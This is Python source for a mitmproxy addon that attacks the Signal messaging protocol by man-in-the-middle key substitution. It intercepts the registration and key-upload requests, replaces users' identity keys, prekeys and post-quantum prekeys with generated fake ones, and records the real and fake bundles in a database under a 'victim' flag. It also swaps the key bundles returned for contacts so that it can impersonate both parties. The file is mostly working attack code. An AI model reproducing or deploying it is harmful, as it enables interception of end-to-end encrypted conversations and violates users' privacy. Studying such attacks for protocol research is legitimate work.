from mitmproxy.http import HTTPFlow
#from mitmproxy import ctx
from dataclasses import dataclass
from typing import Optional
import logging
from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
import json
from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
from base64 import b64decode, b64encode
from database import *
from utils import *
import re

from proto_python.wire_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.storage_pb2 import *
from proto_python.WebSocketResources_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.sealed_sender_pb2 import *
from proto_python import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN
from mitm_interface import *
from collections import defaultdict


registration_info = dict()
conversation_session = dict()


@dataclass 
class PendingWebSocket():
    request: WebSocketMessage = None
    respone: WebSocketMessage = None

websocket_open_state = defaultdict(PendingWebSocket)

@dataclass
class KeyData():
    IdenKey: Optional[identity_key.IdentityKeyPair] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[dict] = None
    pq_PreKeys: Optional[dict] = None

    fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    fake_SignedPreKeys: Optional[dict] = None
    fake_secret_SignedPreKeys: Optional[dict] = None

    fake_PreKeys: Optional[dict] = None
    fake_secret_PreKeys: Optional[dict] = None

    fake_pq_PreKeys: Optional[dict] = None
    fake_secret_pq_PreKeys: Optional[dict] = None

    fake_lastResortKey: Optional[dict] = None
    fake_secret_lastResortKey: Optional[dict] = None


@dataclass
class RegistrationInfo():
    aci : Optional[str] = None
    pni : Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None

    aciData: KeyData = None
    pniData: KeyData = None
    ######## Legitimate keys
    # aci_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    # pni_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    # aci_SignedPreKey: Optional[dict] = None
    # pni_SignedPreKey: Optional[dict] = None
    # aci_pq_lastResortKey: Optional[dict] = None
    # pni_pq_lastResortKey: Optional[dict] = None
    # aci_PreKeys: Optional[dict] = None
    # pni_PreKeys: Optional[dict] = None
    # aci_pq_PreKeys: Optional[dict] = None
    # pni_pq_PreKeys: Optional[dict] = None

    ####### Fake keys
    # aci_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    # pni_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None

    # aci_fake_SignedPreKeys: Optional[dict] = None
    # aci_fake_secret_SignedPreKeys: Optional[dict] = None
    # pni_fake_SignedPreKeys: Optional[dict] = None
    # pni_fake_secret_SignedPreKeys: Optional[dict] = None

    # aci_fake_PreKeys: Optional[dict] = None
    # aci_fake_secret_PreKeys: Optional[dict] = None
    # pni_fake_PreKeys: Optional[dict] = None
    # pni_fake_secret_PreKeys: Optional[dict] = None

    # aci_fake_pq_PreKeys: Optional[dict] = None
    # aci_fake_secret_pq_PreKeys: Optional[dict] = None
    # pni_fake_pq_PreKeys: Optional[dict] = None
    # pni_fake_secret_pq_PreKeys: Optional[dict] = None

    # aci_fake_lastResortKey: Optional[dict] = None
    # aci_fake_secret_lastResortKey: Optional[dict] = None
    # pni_fake_lastResortKey: Optional[dict] = None
    # pni_fake_secret_lastResortKey: Optional[dict] = None


api = addons[0]

@api.route("/v1/registration", rtype = RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):

    #logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = json.loads(flow.request.content)
    #logging.info(json.dumps(req, indent=4))

    qry = Device.select().where(Device.aciIdenKey == req["aciIdentityKey"])

    #logging.info(f"QUERY: {qry}")

    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = req['aciSignedPreKey']
    pni_SignedPreKey = req['pniSignedPreKey']

    aci_pq_lastResortKey = req['aciPqLastResortPreKey']
    pni_pq_lastResortKey = req['pniPqLastResortPreKey']

    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()

    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)

    req.update(fake_signed_pre_keys)


    registration_info[flow.client_conn.address[0]] = RegistrationInfo(
                                                    unidentifiedAccessKey = unidentifiedAccessKey,
                                                    aciData= KeyData(
                                                        IdenKey = aci_IdenKey,
                                                        SignedPreKey = aci_SignedPreKey,
                                                        pq_lastResortKey = aci_pq_lastResortKey,
                                                        fake_IdenKey= aci_fake_IdenKey,
                                                        fake_SignedPreKeys = fake_signed_pre_keys["aciSignedPreKey"],
                                                        fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
                                                        # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
                                                        # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
                                                        # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
                                                        # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
                                                        fake_lastResortKey = fake_signed_pre_keys["aciPqLastResortPreKey"],
                                                        fake_secret_lastResortKey = fake_secret_SignedPreKeys["aciPqLastResortSecret"]
                                                    ),
                                                    pniData = KeyData(
                                                        IdenKey = pni_IdenKey,
                                                        SignedPreKey = pni_SignedPreKey,
                                                        pq_lastResortKey = pni_pq_lastResortKey,
                                                        fake_IdenKey= pni_fake_IdenKey,
                                                        fake_SignedPreKeys = fake_signed_pre_keys["pniSignedPreKey"],
                                                        fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
                                                        # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
                                                        # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
                                                        # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
                                                        # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
                                                        fake_lastResortKey = fake_signed_pre_keys["pniPqLastResortPreKey"],
                                                        fake_secret_lastResortKey = fake_secret_SignedPreKeys["pniPqLastResortSecret"]
                                                    )

    )
    # registration_info[flow.client_conn.address[0]] = RegistrationInfo(
    #                                                 unidentifiedAccessKey = unidentifiedAccessKey,
    #                                                 aci_IdenKey = aci_IdenKey, 
    #                                                 pni_IdenKey= pni_IdenKey, 
    #                                                 aci_SignedPreKey = aci_SignedPreKey,
    #                                                 pni_SignedPreKey = pni_SignedPreKey,
    #                                                 aci_pq_lastResortKey = aci_pq_lastResortKey,
    #                                                 pni_pq_lastResortKey = pni_pq_lastResortKey, 

    #                                                 aci_fake_IdenKey = aci_fake_IdenKey, 
    #                                                 pni_fake_IdenKey = pni_fake_IdenKey,
    #                                                 aci_fake_SignedPreKeys = fake_signed_pre_keys["aciSignedPreKey"], 
    #                                                 aci_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
    #                                                 pni_fake_SignedPreKeys = fake_signed_pre_keys["pniSignedPreKey"],
    #                                                 pni_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["pniSignedPreKeySecret"],

    #                                                 aci_fake_lastResortKey = fake_signed_pre_keys["aciPqLastResortPreKey"],
    #                                                 aci_fake_secret_lastResortKey = fake_secret_SignedPreKeys["aciPqLastResortSecret"],
    #                                                 pni_fake_lastResortKey = fake_signed_pre_keys["pniPqLastResortPreKey"],
    #                                                 pni_fake_secret_lastResortKey = fake_secret_SignedPreKeys["pniPqLastResortSecret"],
    #                                                                 )

    #logging.info(f"REGISTRATION INFO: {registration_info}")
    #logging.exception(f"{registration_info}")
    ### TODO: create the Alice classes 

    #logging.info(f"POST {json.loads(flow.request.content.decode())}")
    flow.request.content = json.dumps(req).encode()

@api.route("/v1/registration", rtype = RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):

    resp = json.loads(flow.response.content)
    #logging.info(f"RESPONSE: {resp}")
    ip_address = flow.client_conn.address[0]

    user = User.insert(
        pNumber = resp["number"],
        aci = resp["uuid"],
        pni = resp["pni"],
        isVictim = True
    )

    #logging.info(registration_info)

    device = Device.insert(
        aci = resp["uuid"],
        pni = resp["pni"],
        deviceId = 1,
        aciIdenKey = registration_info[ip_address].aciData.IdenKey,
        pniIdenKey = registration_info[ip_address].pniData.IdenKey,
        unidentifiedAccessKey = registration_info[ip_address].unidentifiedAccessKey,
    )

    # device = Device.insert(
    #     aci = resp["uuid"],
    #     pni = resp["pni"],
    #     deviceId = 1,
    #     aciIdenKey = registration_info[ip_address].aci_IdenKey,
    #     pniIdenKey = registration_info[ip_address].pni_IdenKey,
    #     unidentifiedAccessKey = registration_info[ip_address].unidentifiedAccessKey,
    # )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]
    

@api.route("/v2/keys", rtype = RouteType.REQUEST, method = HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):

    identity = flow.request.query["identity"]

    req = json.loads(flow.request.content)
    address = flow.client_conn.address[0]

    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(address):
        logging.error(f"Address {address} not found in registration_info. {registration_info}")

    key_data = registration_info[address].aciData if identity == "aci" else registration_info[address].pniData

    try:
        alice_identity_key_pair = key_data.fake_IdenKey
    except KeyError:
        logging.exception(f"{flow} AND {registration_info}")

    pq_pre_keys = req["pqPreKeys"]
    pre_keys = req["preKeys"]

    key_data.pq_PreKeys = pq_pre_keys
    key_data.PreKeys = pre_keys

    fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

    req.update(fake_pre_keys)

    key_data.fake_PreKeys = fake_pre_keys["preKeys"]
    key_data.fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
    key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]   
    key_data.fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]


    legit_bundle = LegitBundle.insert(
        type = identity,
        aci = registration_info[address].aci,
        deviceId = 1, # todo: shouldnt be static
        IdenKey = key_data.IdenKey,
        SignedPreKey = key_data.SignedPreKey,
        PreKeys = key_data.PreKeys,
        kyberKeys = key_data.pq_PreKeys,
        lastResortKyber = key_data.pq_lastResortKey
    )

    mitm_bundle = MitMBundle.insert(
        type = identity,
        aci = registration_info[address].aci,
        deviceId = 1, # todo: shouldnt be static
        FakeIdenKey = key_data.fake_IdenKey, 
        FakeSignedPreKey = (key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
        FakePrekeys = (key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
        fakeKyberKeys = (key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys),
        fakeLastResortKyber = (key_data.fake_lastResortKey, key_data.fake_secret_lastResortKey)
    )

    legit_bundle.on_conflict_replace().execute()
    mitm_bundle.on_conflict_replace().execute()
    # if identity == "aci":
    #     try:
    #         alice_identity_key_pair = registration_info[address].aci_fake_IdenKey
    #     except KeyError:
    #         logging.exception(f"{flow} AND {registration_info}")

    #     pq_pre_keys = req["pqPreKeys"]
    #     pre_keys = req["preKeys"]

    #     registration_info[address].aci_pq_PreKeys = pq_pre_keys
    #     registration_info[address].aci_PreKeys = pre_keys

    #     fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

    #     req.update(fake_pre_keys)

    #     registration_info[address].aci_fake_PreKeys = fake_pre_keys["preKeys"]
    #     registration_info[address].aci_fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
    #     registration_info[address].aci_fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]   
    #     registration_info[address].aci_fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]


    #     legit_bundle = LegitBundle.insert(
    #         type = "aci",
    #         aci = registration_info[address].aci,
    #         deviceId = 1,
    #         SignedPreKey = registration_info[address].aci_SignedPreKey,
    #         PreKeys = registration_info[address].aci_PreKeys,
    #         kyberKeys = registration_info[address].aci_pq_PreKeys,
    #         lastResortKyber = registration_info[address].aci_pq_lastResortKey
    #     )

    #     mitm_bundle = MitMBundle.insert(
    #         type = "aci",
    #         aci = registration_info[address].aci,
    #         deviceId = 1,
    #         FakeIdenKey = registration_info[address].aci_fake_IdenKey, 
    #         FakeSignedPreKey = (registration_info[address].aci_fake_SignedPreKeys, registration_info[address].aci_fake_secret_SignedPreKeys),
    #         FakePrekeys = (registration_info[address].aci_fake_PreKeys, registration_info[address].aci_fake_secret_PreKeys),
    #         fakeKyberKeys = (registration_info[address].aci_fake_pq_PreKeys, registration_info[address].aci_fake_secret_pq_PreKeys),
    #         fakeLastResortKyber = (registration_info[address].aci_fake_lastResortKey, registration_info[address].aci_fake_secret_lastResortKey)
    #     )

    #     legit_bundle.on_conflict_replace().execute()
    #     mitm_bundle.on_conflict_replace().execute()

    # elif identity == "pni":
    #     alice_identity_key_pair = registration_info[address].pni_fake_IdenKey

    #     pq_pre_keys = req["pqPreKeys"]
    #     pre_keys = req["preKeys"]

    #     registration_info[address].pni_pq_PreKeys = pq_pre_keys
    #     registration_info[address].pni_PreKeys = pre_keys

    #     fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

    #     req.update(fake_pre_keys)

    #     registration_info[address].pni_fake_PreKeys = fake_pre_keys['preKeys']
    #     registration_info[address].pni_fake_secret_PreKeys = fake_secret_PreKeys['preKeys']
    #     registration_info[address].pni_fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
    #     registration_info[address].pni_fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]
    #     # registration_info[address].pni_pq_PreKeys = pq_pre_keys
    #     # registration_info[address].pni_secret_pq_PreKeys = fake_secret_PreKeys

    #     legit_bundle = LegitBundle.insert(
    #         type = "pni",
    #         aci = registration_info[address].aci,
    #         deviceId = 1,
    #         SignedPreKey = registration_info[address].pni_SignedPreKey,
    #         PreKeys = registration_info[address].pni_PreKeys,
    #         kyberKeys = registration_info[address].pni_pq_PreKeys,
    #         lastResortKyber = registration_info[address].pni_pq_lastResortKey
    #     )

    #     mitm_bundle = MitMBundle.insert(
    #         type = "pni",
    #         aci = registration_info[address].aci,
    #         deviceId = 1,
    #         FakeIdenKey = registration_info[address].pni_fake_IdenKey,
    #         FakeSignedPreKey = (registration_info[address].pni_fake_SignedPreKeys, registration_info[address].pni_fake_secret_SignedPreKeys),
    #         FakePrekeys = (registration_info[address].pni_fake_PreKeys, registration_info[address].pni_fake_secret_PreKeys),
    #         fakeKyberKeys = (registration_info[address].pni_fake_pq_PreKeys, registration_info[address].pni_fake_secret_pq_PreKeys),
    #         fakeLastResortKyber = (registration_info[address].pni_fake_lastResortKey, registration_info[address].pni_fake_secret_lastResortKey)
    #     )

    #     legit_bundle.on_conflict_replace().execute()
    #     mitm_bundle.on_conflict_replace().execute()

    flow.request.content = json.dumps(req).encode()

@api.route("/v2/keys/{identifier}/{device_id}", rtype = RouteType.RESPONSE, method = HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
    #logging.exception((flow.response.content, identifier, device_id))

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
    identity, uuid = identifier.split(":")

    bob_identity_key_public = base64.b64decode(resp["identityKey"])

    ############ MitmToBob setup (fake Alice)
    for id, bundle in enumerate(resp["devices"]):

        # data should be uuid of Alice and the device id (in this case 1 is ok)
        fakeVictim = MitmUser(address.ProtocolAddress("1", 1))

        bob_registartion_id = bundle["registrationId"]

        bob_kyber_pre_key_public = base64.b64decode(bundle["pqPreKey"]["publicKey"])
        bob_kyber_pre_key_signature = base64.b64decode(bundle["pqPreKey"]["signature"] + "==")
        bob_kyber_pre_key_id = bundle["pqPreKey"]["keyId"]
        
        bob_signed_pre_key_public = base64.b64decode(bundle["signedPreKey"]["publicKey"])
        bob_pre_key_public = base64.b64decode(bundle["preKey"]["publicKey"])

        device_id = bundle["deviceId"]

        bob_bundle = state.PreKeyBundle(
            bob_registartion_id,
            address.DeviceId(id),
            (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
            state.SignedPreKeyId(1),
            PublicKey.deserialize(bob_signed_pre_key_public),
            base64.b64decode(bundle["signedPreKey"]["signature"] + "=="),
            IdentityKey(bob_identity_key_public),
        )

        bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                               kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                               bob_kyber_pre_key_signature)
        
        legit_bundle = LegitBundle.insert(
            type = identity.lower(),
            aci = uuid,
            deviceId = device_id,
            IdenKey = base64.b64encode(bob_identity_key_public).decode("ascii"),
            SignedPreKey = base64.b64encode(bob_signed_pre_key_public).decode("ascii"),
            PreKeys = base64.b64encode(bob_pre_key_public).decode("ascii"),
            kyberKeys = base64.b64encode(bob_kyber_pre_key_public).decode("ascii"),
            lastResortKyber = base64.b64encode(bob_kyber_pre_key_public).decode("ascii")
        )
        legit_bundle.on_conflict_replace().execute()
        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, id), bob_bundle)

    ############ Swap the prekeybundle TODO 

    for id, bundle in enumerate(resp["devices"]):
        # This should impersonate Bob's info 
        identity_key = MitMBundle.select().where(MitMBundle.type == identity,
                                                    MitMBundle.aci == uuid,
                                                    MitMBundle.deviceId == device_id).first()

        if not identity_key:
            # todo create row
            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id))
        else:
            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id), identity_key = identity_key.FakeIdenKey)
        
        fakeBundle = fakeUser.pre_key_bundle.to_dict()

        logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")

        fakeBundle_wire = {
            "identityKey": fakeBundle["identity_key_public"],
            "devices": [
                {
                    "devicedId": 1,
                    "registrationId": fakeBundle["registration_id"],
                    "preKey": {
                        "keyId": fakeBundle["pre_key_id"],
                        "publicKey": fakeBundle["pre_key_public"]
                    },
                    "signedPreKey": {
                        "keyId": fakeBundle["signed_pre_key_id"],
                        "publicKey": fakeBundle["signed_pre_key_public"],
                        "signature": fakeBundle["signed_pre_key_sign"][:-2] # 
                    },
                    "pqPreKey": {
                        "keyId": fakeBundle["kyber_pre_key_id"],
                        "publicKey": fakeBundle["kyber_pre_key_public"],
                        "signature": fakeBundle["kyber_pre_key_sign"][:-2] # todo: fix this
                    }
                }
            ]
        }
    
    resp.update(fakeBundle_wire)
    conversation_session[(ip_address, identifier)] = (fakeUser, fakeVictim)
    flow.response.content = json.dumps(resp, sort_keys=True).encode()

@api.ws_route("/v1/websocket/")
def _v1_websocket(flow, msg):
    
    #logging.info(f"WEBSOCKET: {msg}")
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.info(f"WEBSOCKET: {ws_msg}")

    id, path = ws_msg.id, ws_msg.path
    if websocket_open_state.get(id):
        logging.warning(f"Message already exists with id {id}")
    websocket_open_state[id].request = ws_msg

    logging.warning(f"Websocket req with id {id} and path {path}")

def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
    logging.info(f"my profile: {identifier} {version} {credentialRequest}")
    # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")

def _v1_ws_profile_futut(flow, identifier, version):
    logging.info(f"my profile: {identifier} {version}")
    # raise RuntimeError(f"my profile: {identifier} {version}")



def _v1_ws_profile(flow, identifier):
    # message = flow.websocket.messages[-1]
    logging.info(f"{identifier}")
    try:
        uuid_type, uuid = re.search(r"(PNI|ACI):([a-f0-9-]+)", identifier).groups()
    except:
        logging.exception(f"Invalid identifier {identifier}")
        return
    content = json.loads(flow.response.content)

    logging.info(f"PROFILE: {content}")

    #pni = User.get(MitMBundle.type == uuid_type, MitMBundle.aci == uuid)
    logging.warning(f"id: {identifier, uuid_type, uuid}")

    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()

    logging.info(f"BUNDLE: {bundle}")

    #content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()

    flow.response.content = json.dumps(content).encode()

from mitmproxy.http import Request, Response, HTTPFlow

def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response

    f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
    from mitmproxy.http import Headers

    if rtype == RouteType.REQUEST:
        # todo: handle headers
        f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port, scheme=ws_msg.scheme, path=ws_msg.path, headers=Headers(), content=ws_msg.body)
    else:
        # todo: handle headeers + reason
        rp = Response(http_version=orig_flow.response.http_version, status_code=ws_msg.status, reason=b"id: ", headers=Headers(), content=ws_msg.body, trailers=None, timestamp_start=orig_flow.response.timestamp_start, timestamp_end=orig_flow.response.timestamp_end)
        f.response = rp
    return f


ws_resp = Router()
from parse import Parser

ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY, _v1_ws_my_profile, None)
ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)

logging.warning(f"ROUTES: {ws_resp.routes}")


@api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
def _v1_websocket_resp(flow, msg):
    
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.response
    logging.info(f"WEBSOCKET: {ws_msg}")

    id = ws_msg.id

    if not websocket_open_state.get(id):
        logging.warning(f"Message request does not exist for id {id}")
        return
    # websocket_open_state[ws_msg.id].request = ws_msg
    path = websocket_open_state[id].request.path

    websocket_open_state[id].response = ws_msg
    logging.warning(f"Websocket resp with id {id} and path {path}")


    f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path) # todo: HARDCODING IS BAD, onii-chan
    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
    if handler:
        handler(f,  *params.fixed, **params.named)

    # if "/v1/profile/" in path: # TODO: fix this when xepor is not retarded
    #     identifier, uuid = re.search(r"/v1/profile/(PNI|ACI):([a-f0-9-]+)", path).groups()
    #     content = json.loads(ws_msg.body)

    #     pni = User.get(MitMBundle.type == uuid)

    #     content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()




addons = [api]
